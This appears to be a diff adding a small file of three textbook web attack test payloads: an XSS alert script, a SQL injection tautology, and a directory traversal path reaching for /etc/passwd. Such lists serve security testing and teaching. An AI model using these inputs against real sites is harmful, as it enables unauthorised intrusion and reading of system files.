@@ -1,0 +1,8 @@
+1. XSS payload: 
+<script>alert('XSS vulnerability')</script>
+
+2. SQL Injection payload: 
+' OR 1=1;--
+
+3. Directory Traversal payload: 
+../../../../../../../../../../../../etc/passwd
